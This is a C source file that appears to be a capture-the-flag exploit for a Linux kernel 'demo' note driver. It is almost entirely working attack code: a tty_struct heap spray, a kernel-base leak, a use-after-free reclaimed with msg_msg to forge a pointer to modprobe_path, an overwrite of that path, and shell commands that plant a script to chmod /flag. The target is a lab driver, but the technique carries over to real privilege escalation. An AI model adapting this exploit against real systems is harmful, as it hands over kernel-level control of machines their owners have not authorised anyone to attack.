#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>

#include "demo_note.h"

#define ASM __asm__
#define PAUSE scanf("%*c");

#include <sys/msg.h>
#include <sys/ipc.h>

struct MsgBuf{
    long mtype;
    char mtext[0x10000]; // 65536
} msgbuf;

int msg_open() {
    int qid;
    if ((qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    return qid;
}

void msg_send(int qid, char *data, size_t size) {
    msgbuf.mtype = 1;
    memcpy( msgbuf.mtext , &data[0x30] , size - 0x30 );
    if (msgsnd(qid, &msgbuf, size - 0x30, 0) == -1 ) {
        perror("msgsnd");
        exit(1);
    }
}

void msg_free(int qid, size_t size) {
    msgbuf.mtype = 1;
    if (msgrcv(qid, &msgbuf, size - 0x30, 1, 0) == -1) {
        perror("msgsnd");
        exit(1);
    }
}


int main(){

    int pfd[0x100];
	for( int i = 0 ; i < 0x100 ; ++i ){
        pfd[i] = open( "/dev/ptmx" , O_RDWR | O_NOCTTY ); // tty_struct
        if (pfd[i] == -1)
            printf("open ptmx err\n");
    }
	for( int i = 0 ; i < 0x100 ; ++i )
        close(pfd[i]);


    int fd = open("/dev/demo", O_RDWR);
    size_t buf[0x1000] = {0};
    add_note(fd, 0x2c0);
    read_note(fd, 0, buf);


    size_t kbase = buf[3] - 0x10a6f20;
    printf( "[*] kernel base -> %p\n", kbase );
    // leak done

    size_t modprobe_path = kbase + 0x1663900;

    add_note(fd, 0x330);

    memset( buf , 0x61 , 0x330 );
    edit_note(fd, 1, buf);

    memset( buf , 0 , 0x330 );
    read_note(fd, 1, buf);
    puts(buf);

    // UAF
    req.arg2.index = 1;
    ioctl( fd , DEMO_MSG_MSG , &req );


    int qid = msg_open();

    struct Note{
        char title[0x30];
        size_t size;
        char* data;
    }fake_note;

    // get UAF note chunk and overwrite data pointer
    fake_note.data = modprobe_path;
    fake_note.size = 0x10;
    msg_send( qid , &fake_note , 0x40 );

    memset( buf , 0 , 0x330 );
    read_note(fd, 1, buf);
    puts(buf);

    edit_note(fd, 1, "/tmp/x");

    puts("[+] Prepare modprobe_path file.");
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x");
    system("chmod +x /tmp/x");

    puts("[+] Prepare trigger file.");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
    

    return 0;
}